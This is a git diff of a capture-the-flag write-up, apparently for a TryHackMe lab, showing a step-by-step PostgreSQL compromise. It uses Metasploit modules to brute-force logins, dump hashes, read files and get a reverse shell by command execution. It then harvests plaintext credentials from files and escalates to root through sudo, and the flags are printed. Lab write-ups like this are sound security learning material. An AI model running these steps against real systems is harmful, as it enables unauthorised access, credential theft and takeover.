@@ -88,21 +88,21 @@ Answer format: ***{********_***_****_***_****_****_***********}
 Let start with nmap scan to identify the running service
 
 ```
-~$ nmap -sV -sC -Pn 10.49.129.49
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-17 20:34 IST
-Nmap scan report for 10.49.129.49
-Host is up (0.027s latency).
-Not shown: 659 closed tcp ports (conn-refused), 340 filtered tcp ports (no-response)
+~$ nmap -sV 10.49.190.166
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-20 20:36 IST
+Nmap scan report for 10.49.190.166
+Host is up (0.025s latency).
+Not shown: 997 closed tcp ports (conn-refused)
 PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
 5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
-|_ssl-date: TLS randomness does not represent time
-| ssl-cert: Subject: commonName=ubuntu
-| Not valid before: 2020-07-29T00:54:25
-|_Not valid after:  2030-07-27T00:54:25
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 there are only one services is running
+* SSh is running on port `22`
+* http on port `80`
 * `postgresql` on port `5432`
-
 
 ## Finding Vulneribality
 
@@ -111,6 +111,9 @@ So let use metasploit auxiliary to scan this rdbms for some vulnerability
 > search auxiliary postgresql
 
 we can see the listed auxilaryers here 
+
+<img width="1741" height="437" alt="image" src="https://github.com/user-attachments/assets/5bee1383-47a1-4d8d-a125-dbacfa8b56ff" />
+
 LEt use number 4 auxiliary/scanner/postgres/postgres_login that says `PostgreSQL Login Utility` basically this try to bruteforce the postgre
 
 Let use this to use this:
@@ -121,24 +124,181 @@ let see what are the configs
 as it says we only need to mention our rhost ip
 > set RHOSTS <ip>
 
-<img width="1898" height="915" alt="image" src="https://github.com/user-attachments/assets/63c073e9-e7a9-49ae-9016-12d3954318a2" />
+<img width="1887" height="914" alt="image" src="https://github.com/user-attachments/assets/22562c38-3087-45ec-8900-6bb2fb75af59" />
 
 Let run this using cmd
 > run
 
-<img width="1330" height="604" alt="image" src="https://github.com/user-attachments/assets/4a70ed09-9b11-4b8f-866c-dfe9d9456e41" />
+<img width="1381" height="655" alt="image" src="https://github.com/user-attachments/assets/0e2aff5c-181e-4006-9a5c-e7b7811328b2" />
+
 We got the creds `postgres:password`
 
 Now we have to find the module that allows us to execute commands with the proper user credentials.
 
 Let search for auxilary again
+to back use:
+
+> back
+Let search
 > search auxilary postgresql
 
-<img width="1722" height="472" alt="image" src="https://github.com/user-attachments/assets/48ea0b67-a19b-41e7-a489-330b59e24b03" />
+<img width="1744" height="500" alt="image" src="https://github.com/user-attachments/assets/fbcd69ee-c7d5-42ee-9b4b-fc919c0e2981" />
+
 we can use this one auxiliary/admin/postgres/postgres_sql as it said `PostgreSQL Server Generic Query`
 
 So we have to set rhost and password to set we can do
+> use 6
+> show options
 > set RHOSTS <IP>
 > set Password password
+
+<img width="1428" height="822" alt="image" src="https://github.com/user-attachments/assets/2da4da05-d8cf-42c7-9ab3-fcae33fc3780" />
+
 > run
 
+<img width="1185" height="252" alt="image" src="https://github.com/user-attachments/assets/fd1aa141-ca4a-4ade-8b01-16299fb9f422" />
+
+Authenticated PostgreSQL access confirmed; server version enumerated successfully.
+
+```
+PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
+```
+Now the next step is dumping user hashes
+back again 
+> back
+search for auxilary that help us to dump hash
+> search auxiliary scanner postgre hashdump
+
+<img width="1194" height="264" alt="image" src="https://github.com/user-attachments/assets/e87ea55a-58cd-4487-bb29-067cf0cbd048" />
+
+Let use it and config
+> use 0
+> show options
+> set RHOST 10.49.190.166
+> set password password
+
+<img width="1429" height="683" alt="image" src="https://github.com/user-attachments/assets/399ee9d4-124d-41be-8668-9791f3d064a5" />
+
+> run
+
+<img width="644" height="387" alt="image" src="https://github.com/user-attachments/assets/d99b6e3c-15c5-484c-867b-675b7e98d5e2" />
+
+
+Ok now the next step is we need to use a module that allows an authenticated user to view files of their choosing on the server for that we r going to use readfile auxilary
+
+> back
+> search auxiliary postgresql
+> use auxiliary/admin/postgres/postgres_readfile or use 5
++
+<img width="1744" height="480" alt="image" src="https://github.com/user-attachments/assets/9817035a-d7a5-47e3-bcfa-c91586525e93" />
+
+> show option
+
+<img width="1456" height="781" alt="image" src="https://github.com/user-attachments/assets/3a807664-cb93-46f5-a799-817ccaf559d6" />
+
+> run
+
+<img width="1097" height="748" alt="image" src="https://github.com/user-attachments/assets/67192a58-b5e5-49e1-9ef4-f5d8128f737b" />
+
+<img width="1291" height="630" alt="image" src="https://github.com/user-attachments/assets/d60f641e-1792-4adf-9788-9ec59c75e1c2" />
+
+now we need to run module that allows arbitrary command execution with the proper user credentials
+
+> back
+> search exploit postgres cmd
+Let use  `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`
+> use 0
+
+<img width="1475" height="473" alt="image" src="https://github.com/user-attachments/assets/0e649f12-b3f4-4584-985c-8858278396e3" />
+
+Let config it 
+
+> show options
+> set RHOST <IP>
+> set Password password
+> set LHOST tun0
+<img width="1447" height="918" alt="image" src="https://github.com/user-attachments/assets/cd5b6913-74e8-4146-9a1d-318535e533cf" />
+
+now run
+
+> run
+
+<img width="1603" height="438" alt="image" src="https://github.com/user-attachments/assets/67b50e92-43f4-4939-b84f-f3d2436f1f73" />
+
+We get the shell 
+let stable the shell 
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+<img width="1605" height="551" alt="image" src="https://github.com/user-attachments/assets/758eaed8-8aeb-441a-9107-0a8d1b0485ad" />
+
+Priv esc as dark
+after entring in system i try to find and got 2 user dir in home alison contain user flag but we dont have permission to chec it then i check dark and find credential for dark 
+```
+cd /home
+cat /home/dark/credentials.txt
+dark:qwerty1234#!hackme
+```
+<img width="853" height="558" alt="image" src="https://github.com/user-attachments/assets/db632694-0771-469a-a859-c76c5a956ee6" />
+
+Let use ssh to login and get shell
+
+```
+death@esther:~$ ssh dark@10.49.190.166
+dark@10.49.190.166's password: qwerty1234#!hackme
+$ 
+```
+
+We still dont have perm to view the flag let take a look at config file maybe we can find something there 
+```
+$ cat /home/alison/user.txt
+cat: /home/alison/user.txt: Permission denied
+$ cd /var/www/html/   
+$ ls
+config.php  poster
+$ cat config.php
+<?php 
+	
+	$dbhost = "127.0.0.1";
+	$dbuname = "alison";
+	$dbpass = "p4ssw0rdS3cur3!#";
+	$dbname = "mysudopassword";
+?>$ 
+```
+Crazy we got alison password now we can login 
+
+Let Login as Alison
+```
+$ su alison
+Password: p4ssw0rdS3cur3!#
+$ su alison
+Password: 
+alison@ubuntu:/var/www/html$ cd
+alison@ubuntu:~$ cat user.txt 
+```
+
+## User flag.txt
+```
+THM{postgresql_fa1l_conf1gurat1on}
+```
+
+## Privilege Escalation Enumeration
+```
+sudo -l
+```
+
+```
+alison@ubuntu:~$ sudo  -l
+[sudo] password for alison: p4ssw0rdS3cur3!#
+Matching Defaults entries for alison on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alison may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+alison@ubuntu:~$ sudo -s
+root@ubuntu:~# cat /root/root.txt 
+```
+## Root Flag
+```
+THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
+```
